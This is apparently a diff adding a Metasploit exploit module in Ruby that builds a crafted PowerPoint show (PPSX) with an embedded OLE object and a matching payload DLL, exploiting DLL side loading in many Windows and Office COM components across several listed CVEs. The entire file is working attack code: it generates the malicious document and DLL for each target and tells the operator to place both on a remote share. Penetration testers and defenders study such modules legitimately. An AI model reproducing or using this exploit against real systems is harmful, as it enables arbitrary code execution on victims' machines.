@@ -1,0 +1,280 @@
+require 'zip'
+require 'base64'
+require 'msf/core'
+require 'rex/ole'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Office OLE Multiple DLL Side Loading Vulnerabilities',
+      'Description' => %q{
+        Multiple DLL side loading vulnerabilities were found in various COM components.
+        These issues can be exploited by loading various these components as an embedded
+        OLE object. When instantiating a vulnerable object Windows will try to load one
+        or more DLLs from the current working directory. If an attacker convinces the
+        victim to open a specially crafted (Office) document from a directory also
+        containing the attacker's DLL file, it is possible to execute arbitrary code with
+        the privileges of the target user. This can potentially result in the attacker
+        taking complete control of the affected system.
+      },
+      'Author' => 'Yorick Koster',
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          ['CVE', '2015-6132'],
+          ['CVE', '2015-6128'],
+          ['CVE', '2015-6133'],
+          ['CVE', '2016-0041'],
+          ['CVE', '2016-0100'],
+          ['CVE', '2016-3235'],
+          ['MSB', 'MS15-132'],
+          ['MSB', 'MS16-014'],
+          ['MSB', 'MS16-025'],
+          ['MSB', 'MS16-041'],
+          ['MSB', 'MS16-070'],
+          ['URL', 'https://securify.nl/advisory/SFY20150801/com__services_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150805/event_viewer_snapin_multiple_dll_side_loading_vulnerabilities.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150803/windows_authentication_ui_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20151102/shutdown_ux_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150802/shockwave_flash_object_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150806/ole_db_provider_for_oracle_multiple_dll_side_loading_vulnerabilities.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150905/nps_datastore_server_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150906/bda_mpeg2_transport_information_filter_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20151101/mapsupdatetask_task_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150904/windows_mail_find_people_dll_side_loading_vulnerability.html'],
+          ['URL', 'https://securify.nl/advisory/SFY20150804/microsoft_visio_multiple_dll_side_loading_vulnerabilities.html'],
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread',
+          'PAYLOAD' => 'windows/exec',
+          'CMD' => 'C:\\Windows\\System32\\calc.exe',
+        },
+      'Payload' => { 'Space'	=> 2048, },
+      'Platform' => 'win',
+      'Arch' => [ ARCH_X86, ARCH_X64 ],
+      'Targets' =>
+        [
+          [ 'All', {} ],
+          [
+            'COM+ Services / Windows Vista - 10 / Office 2007 - 2016 (MS15-132)',
+              {
+                'DLL' => 'mqrt.dll',
+                # {ecabafc9-7f19-11d2-978e-0000f8757e2a}
+                'CLSID' => "\xC9\xAF\xAB\xEC\x19\x7F\xD2\x11\x97\x8E\x00\x00\xF8\x75\x7E\x2A"
+              }
+          ],
+          [
+            'Shockwave Flash Object / Windows 10 / Office 2013 (APSB15-28)',
+              {
+                'DLL' => 'spframe.dll',
+                # {D27CDB6E-AE6D-11cf-96B8-444553540000}
+                'CLSID' => "\x6E\xDB\x7C\xD2\x6D\xAE\xCF\x11\x96\xB8\x44\x45\x53\x54\x00\x00"
+              }
+          ],
+          [
+            'Windows Authentication UI / Windows 10 / Office 2013 - 2016 (MS15-132)',
+              {
+                'DLL' => 'wuaext.dll',
+                # {D93CE8B5-3BF8-462C-A03F-DED2730078BA}
+                'CLSID' => "\xB5\xE8\x3C\xD9\xF8\x3B\x2C\x46\xA0\x3F\xDE\xD2\x73\x00\x78\xBA"
+              }
+          ],
+          [
+            'Shutdown UX / Windows 10 / Office 2016 (MS15-132)',
+              {
+                'DLL' => 'wuaext.dll',
+                # {14ce31dc-abc2-484c-b061-cf3416aed8ff}
+                'CLSID' => "\xDC\x31\xCE\x14\xC2\xAB\x4C\x48\xB0\x61\xCF\x34\x16\xAE\xD8\xFF"
+              }
+          ],
+          [
+            'MapUpdateTask Tasks / Windows 10 / Office 2016 (MS16-014)',
+              {
+                'DLL' => 'phoneinfo.dll',
+                # {B9033E87-33CF-4D77-BC9B-895AFBBA72E4}
+                'CLSID' => "\x87\x3E\x03\xB9\xCF\x33\x77\x4D\xBC\x9B\x89\x5A\xFB\xBA\x72\xE4"
+              }
+          ],
+          [
+            'Microsoft Visio 2010 / Windows 7 (MS16-070)',
+              {
+                'DLL' => 'msoutls.dll',
+                # 6C92B806-B900-4392-89F7-2ED4B4C23211}
+                'CLSID' => "\x06\xB8\x92\x6C\x00\xB9\x92\x43\x89\xF7\x2E\xD4\xB4\xC2\x32\x11"
+              }
+          ],
+          [
+            'Event Viewer Snapin / Windows Vista - 7 / Office 2007 - 2013 (MS15-132)',
+              {
+                'DLL' => 'elsext.dll',
+                # {394C052E-B830-11D0-9A86-00C04FD8DBF7}
+                'CLSID' => "\x2E\x05\x4C\x39\x30\xB8\xD0\x11\x9A\x86\x00\xC0\x4F\xD8\xDB\xF7"
+              }
+          ],
+          [
+            'OLE DB Provider for Oracle / Windows Vista - 7 / Office 2007 - 2013 (MS16-014)',
+              {
+                'DLL' => 'oci.dll',
+                # {e8cc4cbf-fdff-11d0-b865-00a0c9081c1d}
+                'CLSID' => "\xBF\x4C\xCC\xE8\xFF\xFD\xD0\x11\xB8\x65\x00\xA0\xC9\x08\x1C\x1D"
+              }
+          ],
+          [
+            'Windows Mail Find People / Windows Vista / Office 2010 (MS16-025)',
+              {
+                'DLL' => 'wab32res.dll',
+                # {32714800-2E5F-11d0-8B85-00AA0044F941}
+                'CLSID' => "\x00\x48\x71\x32\x5F\x2E\xD0\x11\x8B\x85\x00\xAA\x00\x44\xF9\x41"
+              }
+          ],
+          [
+            'NPS Datastore server / Windows Vista / Office 2010 (MS16-014)',
+              {
+                'DLL' => 'iasdatastore2.dll',
+                # {48da6741-1bf0-4a44-8325-293086c79077}
+                'CLSID' => "\x41\x67\xDA\x48\xF0\x1B\x44\x4A\x83\x25\x29\x30\x86\xC7\x90\x77"
+              }
+          ],
+          [
+            'BDA MPEG2 Transport Information Filter / Windows Vista / Office 2010 (MS16-014)',
+              {
+                'DLL' => 'ehTrace.dll',
+                # {FC772AB0-0C7F-11D3-8FF2-00A0C9224CF4}
+                'CLSID' => "\xB0\x2A\x77\xFC\x7F\x0C\xD3\x11\x8F\xF2\x00\xA0\xC9\x22\x4C\xF4"
+              }
+          ],
+        ],
+      'Privileged' => false,
+      'DisclosureDate' => 'Dec 8 2015',
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        OptString.new('FILENAME', [true, 'The PPSX file', 'msf.ppsx']),
+      ], self.class)
+  end
+
+  def exploit
+    if target.name == 'All'
+        targets = @targets
+    else
+        targets = [ target ]
+    end
+
+    @arch.each do |a|
+      exploit_regenerate_payload('win', a, nil)
+      targets.each do |t|
+        if t.name == 'All'
+          next
+        end
+        print_status("Using target #{t.name}")
+
+        dll_name = t['DLL']
+        if target.name == 'All'
+          ppsx_name = t.name.split(/\//).first + ".ppsx"
+        else
+          ppsx_name = datastore['FILENAME']
+        end
+
+        print_status("Creating the payload DLL (#{a})...")
+
+        opts = {}
+        opts[:arch] = [ a ]
+        dll = generate_payload_dll(opts)
+        dll_path = store_file(dll, a, dll_name)
+        print_good("#{dll_name} stored at #{dll_path}, copy it to a remote share")
+
+        print_status("Creating the PPSX file...")
+        ppsx = get_ppsx(t['CLSID'])
+        ppsx_path = store_file(ppsx, a, ppsx_name)
+        print_good("#{ppsx_name} stored at #{ppsx_path}, copy it to a remote share")
+      end
+    end
+  end
+
+  def store_file(data, subdir, filename)
+    ltype = "exploit.fileformat.#{self.shortname}"
+
+    if ! ::File.directory?(Msf::Config.local_directory)
+      FileUtils.mkdir_p(Msf::Config.local_directory)
+    end
+
+    subdir.gsub!(/[^a-z0-9\.\_\-]+/i, '')
+    if ! ::File.directory?(Msf::Config.local_directory + "/" + subdir)
+      FileUtils.mkdir_p(Msf::Config.local_directory + "/" + subdir)
+    end
+
+    if filename and not filename.empty?
+      if filename =~ /(.*)\.(.*)/
+        ext = $2
+        fname = $1
+      else
+        fname = filename
+      end
+    else
+      fname = "local_#{Time.now.utc.to_i}"
+    end
+
+    fname = ::File.split(fname).last
+
+    fname.gsub!(/[^a-z0-9\.\_\-]+/i, '')
+    fname << ".#{ext}"
+
+    path = File.join(Msf::Config.local_directory + "/" + subdir, fname)
+    full_path = ::File.expand_path(path)
+    File.open(full_path, "wb") { |fd| fd.write(data) }
+
+    report_note(:data => full_path.dup, :type => "#{ltype}.localpath")
+
+    full_path.dup
+  end
+
+  def create_ole(clsid)
+    ole_tmp = Rex::Quickfile.new('ole')
+    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)
+
+    stm = stg.create_stream("\x01OLE10Native")
+    stm.close
+
+    directory = stg.instance_variable_get(:@directory)
+    directory.each_entry do |entry|
+      if entry.instance_variable_get(:@_ab) == 'Root Entry'
+        clsid = Rex::OLE::CLSID.new(clsid)
+        entry.instance_variable_set(:@_clsId, clsid)
+      end
+    end
+
+    # write to disk
+    stg.close
+
+    ole_contents = File.read(ole_tmp.path)
+    ole_tmp.close
+    ole_tmp.unlink
+
+    ole_contents
+  end
+
+  def get_ppsx(clsid)
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'office_ole_multiple_dll_hijack.ppsx')
+    fd = ::File.open(path, "rb")
+    data = fd.read(fd.stat.size)
+    fd.close
+    ppsx = Rex::Zip::Archive.new
+
+    Zip::InputStream.open(StringIO.new(data)) do |zis|
+      while entry = zis.get_next_entry
+        ppsx.add_file(entry.name, zis.read)
+      end
+    end
+
+    ppsx.add_file('/ppt/embeddings/oleObject1.bin', create_ole(clsid))
+    ppsx.pack
+  end
+
+end
